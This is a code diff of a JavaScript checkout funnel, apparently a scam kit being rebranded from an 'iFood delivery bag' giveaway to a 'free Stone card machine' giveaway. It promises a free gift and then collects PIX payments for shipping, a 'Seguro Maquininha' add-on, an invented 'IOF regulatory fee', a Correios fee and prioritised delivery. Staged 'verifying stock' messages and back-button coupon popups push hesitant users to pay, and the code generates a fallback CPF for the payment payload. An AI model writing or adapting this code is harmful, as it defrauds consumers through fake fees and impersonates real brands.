@@ -1,92 +1,41 @@
 ﻿const questions = {
     start: {
         id: 'start',
-        text: 'Você já realiza entregas pelo iFood?',
+        text: 'Qual é a sua maquininha de cartão atual?',
         options: [
-            { text: 'Sim, já sou parceiro', icon: '🛵', next: 'tempo_atividade' },
-            { text: 'Ainda não, quero começar', icon: '🚀', next: 'possu_veiculo' }
+            { text: 'Ton', icon: '🟢', next: 'taxas_atuais' },
+            { text: 'Mercado Pago', icon: '🔵', next: 'taxas_atuais' },
+            { text: 'PagSeguro / Outras', icon: '🟡', next: 'taxas_atuais' },
+            { text: 'Nenhuma, quero começar', icon: '🚀', next: 'taxas_atuais' }
         ]
     },
-    tempo_atividade: {
-        id: 'tempo_atividade',
-        text: 'Há quanto tempo você está nas entregas?',
+    taxas_atuais: {
+        id: 'taxas_atuais',
+        text: 'Você acha as taxas da sua maquininha atual (ou das concorrentes) muito altas?',
         options: [
-            { text: 'Estou começando agora', icon: '🌱', next: 'disponibilidade' },
-            { text: 'Menos de 1 ano', icon: '⭐', next: 'disponibilidade' },
-            { text: 'Mais de 1 ano', icon: '🏆', next: 'disponibilidade' }
+            { text: 'Sim, são absurdas!', icon: '🤬', next: 'beneficio_zero' },
+            { text: 'Poderiam ser menores', icon: '📉', next: 'beneficio_zero' },
+            { text: 'Quero a menor taxa do Brasil', icon: '👑', next: 'beneficio_zero' }
         ]
     },
-    possu_veiculo: {
-        id: 'possu_veiculo',
-        text: 'Você já tem veículo para entregas?',
+    beneficio_zero: {
+        id: 'beneficio_zero',
+        text: 'E se você pudesse ter uma das melhores maquininhas do mercado com TAXA ZERO nos primeiros 30 dias?',
         options: [
-            { text: 'Sim, já tenho', icon: '✅', next: 'tipo_veiculo' },
-            { text: 'Estou providenciando', icon: '🛠️', next: 'tipo_veiculo' }
+            { text: 'Eu QUERO muito!', icon: '😍', next: 'envio' },
+            { text: 'Onde eu clico?!', icon: '👇', next: 'envio' }
         ]
     },
-    tipo_veiculo: {
-        id: 'tipo_veiculo',
-        text: 'Qual será seu principal meio de entrega?',
+    envio: {
+        id: 'envio',
+        text: 'Ótimo! Para onde devemos enviar a sua Maquininha Stone Oficial de presente?',
         options: [
-            { text: 'Moto', icon: '🏍️', next: 'cnh_status' },
-            { text: 'Bicicleta', icon: '🚲', next: 'disponibilidade' }
-        ]
-    },
-    cnh_status: {
-        id: 'cnh_status',
-        text: 'Qual é a situação da sua CNH?',
-        options: [
-            { text: 'EAR (Atividade remunerada)', icon: '✅', next: 'disponibilidade' },
-            { text: 'CNH comum (sem EAR)', icon: '⚠️', next: 'disponibilidade' },
-            { text: 'Provisória', icon: '🔰', next: 'disponibilidade' }
-        ]
-    },
-    disponibilidade: {
-        id: 'disponibilidade',
-        text: 'Quantas horas por dia você pretende ficar online?',
-        options: [
-            { text: 'Até 4 horas', icon: '⏱️', next: 'objetivo_renda' },
-            { text: '4 a 8 horas', icon: '💼', next: 'objetivo_renda' },
-            { text: 'Mais de 8 horas', icon: '🚀', next: 'objetivo_renda' }
-        ]
-    },
-    objetivo_renda: {
-        id: 'objetivo_renda',
-        text: 'Qual é seu objetivo com as entregas?',
-        options: [
-            { text: 'Renda extra', icon: '💡', next: 'regiao_preferencia' },
-            { text: 'Renda principal', icon: '📈', next: 'regiao_preferencia' },
-            { text: 'Quero crescer rápido', icon: '🔥', next: 'regiao_preferencia' }
-        ]
-    },
-    regiao_preferencia: {
-        id: 'regiao_preferencia',
-        text: 'Onde você prefere atuar?',
-        options: [
-            { text: 'Centro e arredores', icon: '🏙️', next: 'equipamento' },
-            { text: 'Bairros residenciais', icon: '🏡', next: 'equipamento' },
-            { text: 'Próximo a shoppings', icon: '🛍️', next: 'equipamento' }
-        ]
-    },
-    equipamento: {
-        id: 'equipamento',
-        text: 'Você já tem bag térmica em boas condições?',
-        options: [
-            { text: 'Sim, mas preciso trocar', icon: '♻️', next: 'horario_pico' },
-            { text: 'Não tenho, preciso da primeira', icon: '🎒', next: 'horario_pico' },
-            { text: 'Tenho e quero uma reserva', icon: '✅', next: 'horario_pico' }
-        ]
-    },
-    horario_pico: {
-        id: 'horario_pico',
-        text: 'Você consegue rodar em horários de pico (almoço/jantar)?',
-        options: [
-            { text: 'Sim, com certeza', icon: '🔥', next: 'personal_step' },
-            { text: 'Consigo às vezes', icon: '📅', next: 'personal_step' },
-            { text: 'Prefiro horários alternativos', icon: '🌙', next: 'personal_step' }
+            { text: 'Para o meu negócio', icon: '🏢', next: 'personal_step' },
+            { text: 'Para a minha casa', icon: '🏠', next: 'personal_step' }
         ]
     }
 };
+
 
 const STORAGE_KEYS = {
     personal: 'ifoodbag.personal',
@@ -397,7 +346,7 @@ function setupGlobalBackRedirect(page) {
             saveBump({
                 selected: false,
                 price: 0,
-                title: 'Seguro Bag'
+                title: 'Seguro Maquininha'
             });
             trackLead('orderbump_back_skip', {
                 stage: 'orderbump',
@@ -442,7 +391,7 @@ function setupGlobalBackRedirect(page) {
                 const finalPrice = Math.max(0, roundMoney(baseEconomico - finalAmountOff));
                 const checkoutBackShipping = {
                     id: 'economico',
-                    name: 'Envio Economico iFood',
+                    name: 'Envio Economico Stone',
                     eta: '5 a 8 dias uteis',
                     price: finalPrice,
                     basePrice: baseEconomico,
@@ -457,7 +406,7 @@ function setupGlobalBackRedirect(page) {
                 saveBump({
                     selected: false,
                     price: 0,
-                    title: 'Seguro Bag'
+                    title: 'Seguro Maquininha'
                 });
                 trackLead('checkout_back_coupon10_direct_pix', {
                     stage: 'checkout',
@@ -592,7 +541,7 @@ function setupGlobalBackRedirect(page) {
                             pix
                                 ? applyCouponToShipping({
                                     id: String(pix?.shippingId || 'padrao'),
-                                    name: String(pix?.shippingName || 'Envio Padrão iFood'),
+                                    name: String(pix?.shippingName || 'Envio Padrão Stone'),
                                     eta: '',
                                     price: fallbackShippingBase,
                                     basePrice: fallbackShippingBase,
@@ -695,7 +644,7 @@ function getBackRedirectOffer(page, level = 1) {
         mode: 'coupon',
         badge: 'Cupom exclusivo',
         title: 'Desconto liberado no frete',
-        message: 'Voce ganhou R$ 5,00 de desconto no frete da Bag.',
+        message: 'Voce ganhou R$ 5,00 de desconto no frete da Maquininha.',
         subtitle: 'Oferta valida agora nesta sessao',
         cta: 'Usar cupom e pagar mais barato',
         shownEvent: 'coupon_offer_shown',
@@ -734,11 +683,11 @@ function ensureCouponModalElements() {
             <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
                 <div class="modal-card">
                     <div class="coupon-hero">
-                        <img src="/assets/bagfoto.webp" alt="Bag iFood com desconto">
+                        <img src="/assets/stone_maquininha.webp" alt="Maquininha Stone com desconto">
                     </div>
                     <span id="coupon-badge" class="modal-badge">Cupom exclusivo</span>
                     <h3 id="coupon-title">Desconto liberado no frete</h3>
-                    <p id="coupon-message">Você ganhou R$ 5,00 de desconto no frete da Bag.</p>
+                    <p id="coupon-message">Você ganhou R$ 5,00 de desconto no frete da Maquininha.</p>
                     <span id="coupon-subtitle" class="coupon-subtitle">Oferta válida agora nesta sessão</span>
                     <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
                 </div>
@@ -1278,7 +1227,7 @@ function initProcessing() {
     const overlayEl = document.getElementById('vsl-audio-overlay');
     const overlayBtn = document.getElementById('vsl-audio-btn');
     const loadingTexts = [
-        'Verificando estoque da bag na sua região...',
+        'Verificando estoque da maquininha na sua região...',
         'Validando seus dados com segurança...',
         'Confirmando sua prioridade na fila...',
         'Liberando o acesso ao resgate...'
@@ -1544,7 +1493,7 @@ function initCheckout() {
     const checkoutNeutralBump = {
         selected: false,
         price: 0,
-        title: 'Seguro Bag'
+        title: 'Seguro Maquininha'
     };
     saveBump(checkoutNeutralBump);
 
@@ -1614,7 +1563,7 @@ function initCheckout() {
             if (checkoutNextStep) checkoutNextStep.textContent = 'Escolha o frete ideal para continuar para a proxima etapa.';
         } else if (checkoutNextStep) {
             checkoutNextStep.textContent = orderBumpHintEnabled
-                ? 'Frete selecionado. Agora voce segue para a oferta de Seguro Bag.'
+                ? 'Frete selecionado. Agora voce segue para a oferta de Seguro Maquininha.'
                 : 'Frete selecionado. Agora voce segue direto para o pagamento PIX.';
         }
 
@@ -1639,7 +1588,7 @@ function initCheckout() {
         couponBanner.classList.remove('hidden');
         couponBanner.innerHTML = `
             <strong>Cupom aplicado:</strong> ${coupon.code || 'FRETE5'}
-            <span>R$ ${amountOff.toFixed(2).replace('.', ',')} de desconto no frete da Bag</span>
+            <span>R$ ${amountOff.toFixed(2).replace('.', ',')} de desconto no frete da Maquininha</span>
         `;
     }
 
@@ -1910,7 +1859,7 @@ function initCheckout() {
         const selectedShipping = {
             ...opt,
             id: String(opt.id || 'padrao').trim() || 'padrao',
-            name: String(opt.name || 'Frete iFood').trim() || 'Frete iFood',
+            name: String(opt.name || 'Frete Stone').trim() || 'Frete Stone',
             price: Number(Number(opt.price || 0).toFixed(2)),
             basePrice: Number(basePrice.toFixed(2)),
             originalPrice: Number(basePrice.toFixed(2)),
@@ -2230,7 +2179,7 @@ function initOrderBump() {
     const neutralBump = {
         selected: false,
         price: 0,
-        title: 'Seguro Bag'
+        title: 'Seguro Maquininha'
     };
     saveBump(neutralBump);
     setStage('orderbump');
@@ -2270,7 +2219,7 @@ function initOrderBump() {
         saveBump({
             selected,
             price: bumpPrice,
-            title: 'Seguro Bag'
+            title: 'Seguro Maquininha'
         });
         trackLead(selected ? 'orderbump_accepted' : 'orderbump_declined', {
             stage: 'orderbump',
@@ -2325,7 +2274,7 @@ function initUpsellIof() {
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrao Stone';
     }
     if (currentTxid) {
         const txid = String(pix?.idTransaction || '').trim();
@@ -2379,7 +2328,7 @@ function initUpsellIof() {
 
         const iofShipping = {
             id: 'taxa_iof_bag',
-            name: 'Taxa regulatoria IOF da BAG',
+            name: 'Taxa regulatoria IOF da MAQUININHA',
             eta: 'Regularizacao imediata',
             price: offerPrice
         };
@@ -2400,7 +2349,7 @@ function initUpsellIof() {
                 upsell: {
                     enabled: true,
                     kind: 'taxa_iof_bag',
-                    title: 'Taxa de IOF da BAG',
+                    title: 'Taxa de IOF da MAQUININHA',
                     price: offerPrice,
                     previousTxid: String(pix?.idTransaction || '').trim(),
                     targetAfterPaid: 'upsell-correios.html'
@@ -2463,7 +2412,7 @@ function initUpsellCorreios() {
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrao Stone';
     }
     if (currentTxid) {
         const txid = String(pix?.idTransaction || '').trim();
@@ -2594,7 +2543,7 @@ function initUpsell() {
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrao Stone';
     }
     if (currentTxid) {
         const txid = String(pix?.idTransaction || '').trim();
@@ -2640,7 +2589,7 @@ function initUpsell() {
             upsellStep.classList.add('upsell-step--paid');
         }
         if (subtitle) {
-            subtitle.textContent = 'Pagamento confirmado. Sua prioridade de envio foi ativada e sua bag entra no proximo lote.';
+            subtitle.textContent = 'Pagamento confirmado. Sua prioridade de envio foi ativada e sua maquininha entra no proximo lote.';
         }
         if (highlightRow) {
             highlightRow.innerHTML = '<span>Status da prioridade</span><strong class="text-success">Confirmado</strong>';
@@ -2656,7 +2605,7 @@ function initUpsell() {
         if (deliveryGrid) deliveryGrid.classList.add('hidden');
         if (benefitsList) {
             benefitsList.innerHTML = [
-                'Recebimento prioritario confirmado para esta bag',
+                'Recebimento prioritario confirmado para esta maquininha',
                 'Seu pedido foi movido para o proximo lote de saida',
                 'Acompanhe o rastreio para a previsao final de entrega'
             ].map((text) => `<li>${text}</li>`).join('');
@@ -2776,7 +2725,7 @@ function initPix() {
         saveBump({
             selected: false,
             price: 0,
-            title: 'Seguro Bag'
+            title: 'Seguro Maquininha'
         });
         setStage('pix');
         createPixCharge(shipping, 0, { sourceStage: 'orderbump_back_fallback' })
@@ -3519,9 +3468,9 @@ function initAdmin() {
         processing: { label: 'processando.html', desc: 'Video + verificacao de elegibilidade' },
         success: { label: 'sucesso.html', desc: 'Aprovado e chamada para resgate' },
         checkout: { label: 'checkout.html', desc: 'Endereco e selecao de frete' },
-        orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
+        orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Maquininha' },
         pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
-        'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de IOF da bag' },
+        'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de IOF da maquininha' },
         'upsell-correios': { label: 'upsell-correios.html', desc: 'Upsell 2: taxa de objeto grande dos Correios' },
         upsell: { label: 'upsell.html', desc: 'Upsell 3: adiantamento do frete' }
     };
@@ -4685,19 +4634,19 @@ function buildShippingOptions(rawCep) {
     const baseOptions = [
         {
             id: 'economico',
-            name: 'Envio Econômico iFood',
+            name: 'Envio Econômico Stone',
             price: 19.9,
             eta: '5 a 8 dias úteis'
         },
         {
             id: 'padrao',
-            name: 'Envio Padrão iFood',
+            name: 'Envio Padrão Stone',
             price: 25.9,
             eta: '3 a 5 dias úteis'
         },
         {
             id: 'expresso',
-            name: 'Envio Prioritário iFood',
+            name: 'Envio Prioritário Stone',
             price: 29.9,
             eta: '1 a 3 dias úteis'
         }
@@ -4808,7 +4757,7 @@ function getPixPersonalPayload() {
     const fallbackEmail = `lead.${suffix}@ifoodbag.app`;
 
     return {
-        name: String(personal.name || '').trim() || 'Cliente iFood',
+        name: String(personal.name || '').trim() || 'Cliente Stone',
         cpf: cpfDigits || generateFallbackCpf(sessionId),
         birth: String(personal.birth || '').trim() || '01/01/1990',
         email: String(personal.email || '').trim() || fallbackEmail,
@@ -5024,7 +4973,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             sourceUrl: window.location.href,
             utm: getUtmData(),
             shipping: shippingForPix,
-            bump: extraCharge > 0 ? { title: 'Seguro Bag', price: extraCharge } : null,
+            bump: extraCharge > 0 ? { title: 'Seguro Maquininha', price: extraCharge } : null,
             personal: getPixPersonalPayload(),
             address: getPixAddressPayload(),
             extra: loadAddressExtra(),
@@ -5056,7 +5005,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             amount,
             shippingId: shippingForPix.id,
             shippingName: shippingForPix.name,
-            bumpName: extraCharge > 0 ? 'Seguro Bag' : '',
+            bumpName: extraCharge > 0 ? 'Seguro Maquininha' : '',
             bumpPrice: extraCharge,
             createdAt: Date.now(),
             isUpsell,
